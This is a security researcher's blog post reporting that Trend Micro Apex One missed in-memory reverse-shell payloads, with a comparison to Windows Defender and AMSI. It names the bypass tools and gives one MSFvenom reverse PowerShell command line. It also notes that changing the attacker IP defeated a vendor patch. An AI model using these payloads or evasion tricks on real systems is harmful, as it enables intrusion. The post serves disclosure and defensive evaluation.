![Linkedin](Post%20Images/linkedin.png) [Linkedin](https://www.linkedin.com/in/ryangore/) | ![Github](Post%20Images/github.png) [Github](https://github.com/0v3rride)

# Bypassing Trend Micro Apex One
___________________________________

# Background
1. Apex One can be bypassed using simple or even very basic payloads that mostly reside in memory. 
2. Apex One can be bypassed using exploit tools or frameworks that have aged well beyond the point where many would logically think that most vendors would have a solution to detect their signatures, etc.

Obviously, a product like this isn't going to prevent bleeding-edge methods or techniques that are used to get around them. The same goes for customized payloads. For example, the simple reverse PowerShell script I wrote gets around Defender and AMSI in Windows 10 build 1903 as of June 7th. The art of bypassing anti-virus and EDR solutions is a whole other topic on its own that consists of individuals who know much more than I do when it comes to this type of stuff. 

Before you ask, yes I did check the settings in the administration console. I double checked, triple checked, checked a fourth time, checked again and then had a small existential crisis. Other colleagues and individuals from Trend have checked the settings. I'm sure they would have told me to shove off by now and check again if it was something on my end. 

![bms](Post%20Images/BMS.PNG)
![scs](Post%20Images/SCS.PNG)

I first notified Trend of the issues back in February. I should point out that Trend pushed out an update at a point in the process in which Apex One would successfully block anything from PowerShell Empire. However, this glimmer of hope only lasted for a short period of time before I tried again a couple of days later to test for consistency.

# Testing
I wanted to put Trend Micro's Apex One solution to the test. For the sake of testing, the scenario was set in a situation in which an attacker had some sort of access to the machine. This could be a reverse shell, recovered creds that allowed for smblogin, login through RDP, etc. Needless to say, I was a bit shocked when I discovered how trivial it was to get around it. Before I started testing, I had done enough research to know the basics or at least have a decent grasp on the thought process that went into the techniques of bypassing AV and EDR solutions. As expected, Apex was blocking anything malicious that touched the disk. However, things started going downhill when I started testing payloads that resided in memory only. Keep in mind I wasn't trying to get sophisticated or do anything advanced. All I was doing at this point was using well known and publicly available tools and frameworks and throwing them at my test machine to see if the agent would pick it up. All I wanted to do was to make sure it was stopping known payloads and tools.

### Tools and payloads that were used to bypass Apex One:
* MSFvenom: cmd/windows/reverse_powershell lhost=\<attackip\> lport=\<attakport\>
* PowerShell Empire with http listener and launcher to generate the stager
* My custom reverse PowerShell script
* A random reverse [PowerShell one-liner](https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3)
* SilentTrinity


# MSFVenom cmd/windows/reverse_powershell
![msfv_1](Post%20Images/KaliVM.PNG)
![msfv_2](Post%20Images/Win10Prod_LI.jpg)
![msfv_3](Post%20Images/msfvenom_payload.PNG)
![msfv_4](Post%20Images/Win10Prod_rpsh_exec.PNG)
![msfv_5](Post%20Images/msfv_bypass_LI.jpg)
![msfv_6](Post%20Images/msfv_bypass2_LI.jpg)

# Observations
As I mentioned previously, I worked with Trend to get a patch pushed out to specifically alarm on PowerShell Empire (they're still working on the MSFvenom payload). I received the patch on a specified date and it seemed like it was working. PSE was no longer receiving a callback from the target thus producing an agent that would allow me to interact with the remote host. Everything was fine and dandy until I performed the same test a couple of days later. Apex One had once again failed to alert on the C2 connection. At this time I noticed that the IP on my Kali box had changed. Was I able to bypass Apex One once more with PSE just by changing my IP? Yes, I was. To make sure I wasn't hallucinating, I had a colleague execute the stager on their machine and sure enough, I got a callback from the machine.

## PowerShell Empire

#### Round 1 (note the change of IP)
![PSE_1_1](Post%20Images/kalivm.PNG)
![PSE_1_2](Post%20Images/win10prod2_LI.jpg)
![PSE_1_3](Post%20Images/listener_stager.PNG)
![PSE_1_4](Post%20Images/pse_bypass_LI.jpg)

A few minutes later and Apex One still didn't figure out was happening.

#### Round 2 (note the change of IP)
![PSE_2_1](Post%20Images/listener_stager2.PNG)
![PSE_2_2](Post%20Images/pse_bypass2.PNG)
![PSE_2_3](Post%20Images/pse_bypass2_cmds_LI.jpg)

I came across an anomaly during testing when using the MSFvenom payload cmd/windows/reverse_powershell in conjunction with the Magic Unicorn payload generator from TrustedSec. Apex One was catching this for some reason despite being obfuscated via base64 encoding. My basic knowledge of how AV and EDR technologies work leads me to believe that the engine is building a risk rating based on several factors or attributes associated with the PowerShell code. Since the PowerShell code is obfuscated via base64 encoding, it uses this information as one factor along with several other factors to determine whether or not it is harmful or suspicious. In this case, it correctly identified that the payload generated from the Magic Unicorn payload generator is indeed malicious. The opposite seems to occur when planting the base64 encoded PowerShell payload generated from the launcher command in Empire. I'm not so sure why it's catching one and not the other despite both payloads being encoded. Most of the other MSFVenom payloads that I've tested up to this point (windows/shell/reverse_tcp) and outputted in the formats `psh-cmd`, `hta-psh` is detected by Apex One.

# A Shocking Revelation
During testing, I needed to gather metrics from other AV and EDR solutions to compare against Apex One. Why not start with Windows Defender in the latest Windows 10 Pro build? I created an ISO build 1809 (and later 1903 after testing a trial version of CrowdStrike Falcon Prevent), installed the latest updates for the operating system and definitions for Defender. 

![winver](Post%20Images/winver.PNG)

The results shocked me, to say the least. You'd think a free, built-in AV that comes with Windows would be absolute trash, but it's quite the opposite. From my testing, Windows Defender and ASMI in build 1809 were able to block everything Apex One wasn't. It even blocked the aforementioned PowerShell oneliner from the GitHub link. 

![Github One-liner](Post%20Images/amsi_github_oneliner.PNG)

However, I was able to get around it using my custom reverse PowerShell script (this was expected) and silenttrinity. Defender and ASMI did even better in build 1903 as it stone-walled everything except my custom reverse PowerShell script. I should state that more testing will need to be done with silenttrinity as I didn't receive a message from AMSI or Defender saying something malicious was going on. However, I received an error message telling me that the PowerShell stager with the embedded interpreter for the Boo lang payload and the MSBuild.xml stager failed to build correctly. This could be due to changes in the Windows operating system itself in build 1903 or changes in PowerShell and the .NET framework. Furthermore, to rule out the environment as being the culprit of the issues with Apex One, I decided to unload and remove the Apex agent from a production workstation that wasn't important, let Defender take over and perform the same tests. Again, Defender stopped what Apex One couldn't.

# (06-11-19)
* The majority of the payloads that I've created or generated and that have touched the disk were detected as they should be.
* By mere observation, it looks like Trend is having trouble detecting malicious code that runs in memory and in some way interacts with the .NET framework via PowerShell, C#, etc.
* Furthermore, the current factors or attribute flags used to help the engine determine whether or not this code is malicious are simply not sufficient enough in **my opinion**.
* Microsoft's Windows Defender via the latest Windows 10 build is a much better solution at this time.
